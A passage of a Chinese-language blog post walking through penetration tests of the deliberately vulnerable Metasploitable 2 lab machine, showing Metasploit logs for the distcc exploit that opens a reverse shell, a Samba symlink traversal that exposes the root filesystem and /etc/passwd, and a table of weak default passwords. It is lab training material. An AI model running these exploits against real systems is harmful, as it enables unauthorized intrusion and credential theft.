class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.16.57-dev                         ]</span><br><span class="line">+ -- --=[ 1767 exploits - 1007 auxiliary - 307 post       ]</span><br><span class="line">+ -- --=[ 537 payloads - 41 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/unix/misc/distcc_exec </span><br><span class="line">msf exploit(unix/misc/distcc_exec) &gt; <span class="built_in">set</span> RHOST 192.168.111.146</span><br><span class="line">RHOST =&gt; 192.168.111.146</span><br><span class="line">msf exploit(unix/misc/distcc_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.111.144:4444 </span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> rakAuTnjekOLfQAT;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: <span class="string">&quot;rakAuTnjekOLfQAT\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (192.168.111.144:4444 -&gt; 192.168.111.146:46058) at 2018-07-18 14:11:34 +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">daemon</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1(daemon) gid=1(daemon) <span class="built_in">groups</span>=1(daemon)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这写test让我感觉世界越来越不安全，这还是10年前的啊!</p>
+<p>Samba配置了可写文件共享并启用了“ 宽链接 ”（默认打开），也可以用作各种后门来访问不应共享的文件。下面的示例使用Metasploit模块使用匿名连接和可写共享提供对根文件系统的访问。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.111.146</span><br><span class="line">[*] <span class="built_in">exec</span>: smbclient -L //192.168.111.146</span><br><span class="line"></span><br><span class="line">WARNING: The <span class="string">&quot;syslog&quot;</span> option is deprecated</span><br><span class="line">Enter WORKGROUP\root<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Sharename       Type      Comment</span></span><br><span class="line"><span class="string">	---------       ----      -------</span></span><br><span class="line"><span class="string">	print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">	tmp             Disk      oh noes!</span></span><br><span class="line"><span class="string">	opt             Disk      </span></span><br><span class="line"><span class="string">	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))</span></span><br><span class="line"><span class="string">	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))</span></span><br><span class="line"><span class="string">Reconnecting with SMB1 for workgroup listing.</span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Server               Comment</span></span><br><span class="line"><span class="string">	---------            -------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Workgroup            Master</span></span><br><span class="line"><span class="string">	---------            -------</span></span><br><span class="line"><span class="string">	WORKGROUP            METASPLOITABLE</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">msf &gt; use auxiliary/admin/smb/samba_symlink_traversal </span></span><br><span class="line"><span class="string">msf auxiliary(admin/smb/samba_symlink_traversal) &gt; set RHOST 192.168.111.146</span></span><br><span class="line"><span class="string">RHOST =&gt; 192.168.111.146</span></span><br><span class="line"><span class="string">msf auxiliary(admin/smb/samba_symlink_traversal) &gt; set SMBSHARE tmp</span></span><br><span class="line"><span class="string">SMBSHARE =&gt; tmp</span></span><br><span class="line"><span class="string">msf auxiliary(admin/smb/samba_symlink_traversal) &gt; exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] 192.168.111.146:445 - Connecting to the server...</span></span><br><span class="line"><span class="string">[*] 192.168.111.146:445 - Trying to mount writeable share &#x27;</span>tmp<span class="string">&#x27;...</span></span><br><span class="line"><span class="string">[*] 192.168.111.146:445 - Trying to link &#x27;</span>rootfs<span class="string">&#x27; to the root filesystem...</span></span><br><span class="line"><span class="string">[*] 192.168.111.146:445 - Now access the following share to browse the root filesystem:</span></span><br><span class="line"><span class="string">[*] 192.168.111.146:445 - 	\\192.168.111.146\tmp\rootfs\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br><span class="line"><span class="string">msf auxiliary(admin/smb/samba_symlink_traversal) &gt; smbclient //192.168.111.146/tmp</span></span><br><span class="line"><span class="string">[*] exec: smbclient //192.168.111.146/tmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: The &quot;syslog&quot; option is deprecated</span></span><br><span class="line"><span class="string">Enter WORKGROUP\root&#x27;</span>s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; </span><br><span class="line">smb: \&gt; <span class="built_in">cd</span></span><br><span class="line">Current directory is \</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> rootfs</span><br><span class="line">smb: \rootfs\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Mon May 21 02:36:12 2012</span><br><span class="line">  ..                                 DR        0  Mon May 21 02:36:12 2012</span><br><span class="line">  initrd                             DR        0  Wed Mar 17 06:57:40 2010</span><br><span class="line">  media                              DR        0  Wed Mar 17 06:55:52 2010</span><br><span class="line">  bin                                DR        0  Mon May 14 11:35:33 2012</span><br><span class="line">  lost+found                         DR        0  Wed Mar 17 06:55:15 2010</span><br><span class="line">  mnt                                DR        0  Thu Apr 29 04:16:56 2010</span><br><span class="line">  sbin                               DR        0  Mon May 14 09:54:53 2012</span><br><span class="line">  initrd.img                          R  7929183  Mon May 14 11:35:56 2012</span><br><span class="line">  home                               DR        0  Fri Apr 16 14:16:02 2010</span><br><span class="line">  lib                                DR        0  Mon May 14 11:35:22 2012</span><br><span class="line">  usr                                DR        0  Wed Apr 28 12:06:37 2010</span><br><span class="line">  proc                               DR        0  Wed Jul 18 11:34:58 2018</span><br><span class="line">  root                               DR        0  Wed Jul 18 11:37:15 2018</span><br><span class="line">  sys                                DR        0  Wed Jul 18 11:34:59 2018</span><br><span class="line">  boot                               DR        0  Mon May 14 11:36:28 2012</span><br><span class="line">  nohup.out                           R     7984  Wed Jul 18 11:37:17 2018</span><br><span class="line">  etc                                DR        0  Wed Jul 18 14:10:42 2018</span><br><span class="line">  dev                                DR        0  Wed Jul 18 11:35:53 2018</span><br><span class="line">  vmlinuz                             R  1987288  Fri Apr 11 00:55:41 2008</span><br><span class="line">  opt                                DR        0  Wed Mar 17 06:57:39 2010</span><br><span class="line">  var                                DR        0  Mon May 21 05:30:19 2012</span><br><span class="line">  cdrom                              DR        0  Wed Mar 17 06:55:51 2010</span><br><span class="line">  tmp                                 D        0  Wed Jul 18 14:16:29 2018</span><br><span class="line">  srv                                DR        0  Wed Mar 17 06:57:38 2010</span><br><span class="line"></span><br><span class="line">		7282168 blocks of size 1024. 5428700 blocks available</span><br><span class="line"></span><br><span class="line">smb: \rootfs\&gt; <span class="built_in">cd</span> etc</span><br><span class="line">smb: \rootfs\etc\&gt; more passwd</span><br><span class="line">getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.oZuiCN (528.6 KiloBytes/sec) (average 528.6 KiloBytes/sec)</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br><span class="line"><span class="built_in">bind</span>:x:105:113::/var/cache/bind:/bin/false</span><br><span class="line">postfix:x:106:115::/var/spool/postfix:/bin/false</span><br><span class="line">ftp:x:107:65534::/home/ftp:/bin/false</span><br><span class="line">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false</span><br><span class="line">distccd:x:111:65534::/:/bin/false</span><br><span class="line">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span><br><span class="line">service:x:1002:1002:,,,:/home/service:/bin/bash</span><br><span class="line">telnetd:x:112:120::/nonexistent:/bin/false</span><br><span class="line">proftpd:x:113:65534::/var/run/proftpd:/bin/false</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/bin/false</span><br><span class="line">snmp:x:115:65534::/var/lib/snmp:/bin/false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#惊喜!!!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><h3 id="Weak-Passwords"><a href="#Weak-Passwords" class="headerlink" title="Weak Passwords"></a>Weak Passwords</h3><p>除了更明显的后门和错误配置之外，Metasploitable 2还为系统和数据库服务器帐户提供了可怕的密码安全性。主管理用户msfadmin具有与用户名匹配的密码。通过发现此系统上的用户列表，通过使用另一个缺陷来捕获passwd文件，或通过Samba枚举这些用户ID，可以使用暴力攻击来快速访问多个用户帐户。系统上至少配置了以下弱系统帐户。</p>
+<table>
+<thead>
+<tr>
+<th>用户</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>msfadmin</td>
+<td>msfadmin</td>
+</tr>
+<tr>
+<td>user</td>
+<td>user</td>
+</tr>
+<tr>
+<td>postgres</td>
+<td>postgres</td>
+</tr>
+<tr>
+<td>sys</td>
+<td>batman</td>
+</tr>
+<tr>
+<td>klog</td>
+<td>123456789</td>
+</tr>
+<tr>
+<td>servic</td>
+<td>service</td>
+</tr>
+</tbody></table>
+<p>除了这些系统级帐户，还可以使用用户名postgres和密码访问PostgreSQL服务postgres，而root使用空密码打开MySQL服务的用户名。VNC服务使用密码提供远程桌面访问password。</p>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="Vulnerable-Web-Services"><a href="#Vulnerable-Web-Services" class="headerlink" title="Vulnerable Web Services"></a>Vulnerable Web Services</h3><p>Metasploitable 2预先安装了故意易受攻击的Web应用程序。引导Metasploitable 2时，Web服务器自动启动。要访问Web应用程序，请打开Web浏览器并输入URL：</p>
+<blockquote>
+<p>http://&lt;IP&gt;</p>
+</blockquote>
+<p>比如我的地址就是: </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.146/">http://192.168.111.146</a></p>
+</blockquote>
+<p>盗个图<br><img src="https://files.readme.io/dd6e49c-metasploitable-web-home-page.png"></p>
+<p>有个知识点：<br>    192.168.56 / 24是Virtual Box中默认的“仅主机”网络。IP地址从“101”开始分配。根据客户机操作系统的启动顺序，Metasploitable 2的IP地址会有所不同。</p>
+<p>要访问特定的Web应用程序，请单击提供的其中一个链接。通过将应用程序目录名称附加 <strong>http://&lt;IP&gt;</strong> 到创建URL，可以另外访问各个Web应用程序<strong>http://&lt;IP&gt;/&lt;Application Folder&gt;/**。例如，可以在地址处访问（在该示例中）Mutillidae应用程序</strong><a target="_blank" rel="noopener" href="http://192.168.56.101/mutillidae/**%E3%80%82%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E8%A3%85%E5%9C%A8">http://192.168.56.101/mutillidae/**。应用程序安装在</a> <strong>/var/www</strong>目录中的Metasploitable 2中。（注意：使用命令查看列表<strong>ls /var/www</strong>。）<br>我这里的应用程序有下面几个：</p>
+<ul>
+<li>TWIKI</li>
+<li>phpMyAdmin</li>
+<li>Mutilidae</li>
+<li>DVWA</li>
+<li>WebDAV</li>
+</ul>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="Mutillidae"><a href="#Mutillidae" class="headerlink" title="Mutillidae"></a>Mutillidae</h3><p>Mutillidae Web应用程序（NOWASP（Mutillidae））包含来自OWASP Top Ten的所有漏洞以及许多其他漏洞，例如HTML-5 Web存储，表单缓存和点击控制。受DVWA的启发，Mutillidae允许用户将“安全级别”从0（完全不安全）更改为5（安全）。此外，还提供了三个级别的提示，范围从“0级 - 我更努力”（无提示）到“2级 - noob”（最大提示）。如果应用程序被用户注入和黑客攻击损坏，单击“重置数据库”按钮会将应用程序重置为其原始状态。</p>
+<p>这个应用程序包含的漏洞真多，够大家学习了。。。</p>
+<p><strong>学习使我快乐！！！</strong></p>
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><p>来自DVWA主页：“该死的易受攻击的Web应用程序（DVWA）是一个易受攻击的PHP / MySQL Web应用程序。它的主要目标是帮助安全专业人员在法律环境中测试他们的技能和工具，帮助Web开发人员更好地了解保护Web应用程序的过程，并帮助教师/学生在课堂环境中教授/学习Web应用程序安全性。“</p>
+<p>这个环境是可以自己搭建的<br>user：admin<br>pass：password</p>
+<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><h3 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h3><p>此外，可以在以下位置找到一个不明智的PHP信息泄露页面http://<IP>/phpinfo.php。在此示例中，URL将为<a target="_blank" rel="noopener" href="http://192.168.56.101/phpinfo.php%E3%80%82PHP%E4%BF%A1%E6%81%AF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E4%BA%8E%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%86%85%E9%83%A8%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%88%B0%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E4%B8%AD%E5%85%AC%E5%BC%80%E7%9A%84PHP%E7%89%88%E6%9C%AC%E6%98%AF5.2.4%E7%89%88%E6%9C%AC%EF%BC%8C%E7%B3%BB%E7%BB%9F%E5%8F%AF%E8%83%BD%E5%AE%B9%E6%98%93%E5%8F%97%E5%88%B0CVE-2012-1823%E5%92%8CCVE-2012-2311%E7%9A%84%E5%BD%B1%E5%93%8D%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%BD%B1%E5%93%8D%E4%BA%865.3.12%E5%92%8C5.4%E4%B9%8B%E5%89%8D%E7%9A%84PHP%E3%80%82%E5%9C%A85.4.2%E4%B9%8B%E5%89%8D%E7%9A%84x%E3%80%82">http://192.168.56.101/phpinfo.php。PHP信息信息泄露漏洞提供可用于查找漏洞的内部系统信息和服务版本信息。例如，注意到屏幕截图中公开的PHP版本是5.2.4版本，系统可能容易受到CVE-2012-1823和CVE-2012-2311的影响，这些影响了5.3.12和5.4之前的PHP。在5.4.2之前的x。</a></p>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>英语不好主要靠google</p>
+<p><a target="_blank" rel="noopener" href="https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide">Metasploitable 2 Exploitability Guide官方文档</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>h31i
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://h31i.github.io/2019/08/14/linux-kali-metasploitable2/" title="metasploitable2的渗透测试学习">https://h31i.github.io/2019/08/14/linux-kali-metasploitable2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+              <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+              <a href="/tags/ubuntu/" rel="tag"><i class="fa fa-tag"></i> ubuntu</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/08/13/java-databases/" rel="prev" title="面试题-数据库篇">
+      <i class="fa fa-chevron-left"></i> 面试题-数据库篇
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/08/14/linux-bandit/" rel="next" title="Bandit(0-17)-Linux游戏">
+      Bandit(0-17)-Linux游戏 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Download"><span class="nav-number">1.</span> <span class="nav-text">Download</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01"><span class="nav-number">2.</span> <span class="nav-text">0x01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Getting-Started"><span class="nav-number">2.1.</span> <span class="nav-text">Getting Started</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">3.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Services"><span class="nav-number">3.1.</span> <span class="nav-text">Services</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03"><span class="nav-number">4.</span> <span class="nav-text">0x03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unix-Basics"><span class="nav-number">4.1.</span> <span class="nav-text">Unix Basics</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04"><span class="nav-number">5.</span> <span class="nav-text">0x04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Backdoors"><span class="nav-number">5.1.</span> <span class="nav-text">Backdoors</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05"><span class="nav-number">6.</span> <span class="nav-text">0x05</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unintentional-Backdoors"><span class="nav-number">6.1.</span> <span class="nav-text">Unintentional Backdoors</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06"><span class="nav-number">7.</span> <span class="nav-text">0x06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Weak-Passwords"><span class="nav-number">7.1.</span> <span class="nav-text">Weak Passwords</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07"><span class="nav-number">8.</span> <span class="nav-text">0x07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulnerable-Web-Services"><span class="nav-number">8.1.</span> <span class="nav-text">Vulnerable Web Services</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08"><span class="nav-number">9.</span> <span class="nav-text">0x08</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mutillidae"><span class="nav-number">9.1.</span> <span class="nav-text">Mutillidae</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09"><span class="nav-number">10.</span> <span class="nav-text">0x09</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA"><span class="nav-number">10.1.</span> <span class="nav-text">DVWA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10"><span class="nav-number">11.</span> <span class="nav-text">0x10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-Disclosure"><span class="nav-number">11.1.</span> <span class="nav-text">Information Disclosure</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">12.</span> <span class="nav-text">参考文档</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="h31i"
+      src="https://avatars2.githubusercontent.com/u/39379493?s=460&v=4">
+  <p class="site-author-name" itemprop="name">h31i</p>
+  <div class="site-description" itemprop="description">love&peace</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/h31i" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;h31i" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:liuh31i@163.com" title="E-Mail → mailto:liuh31i@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
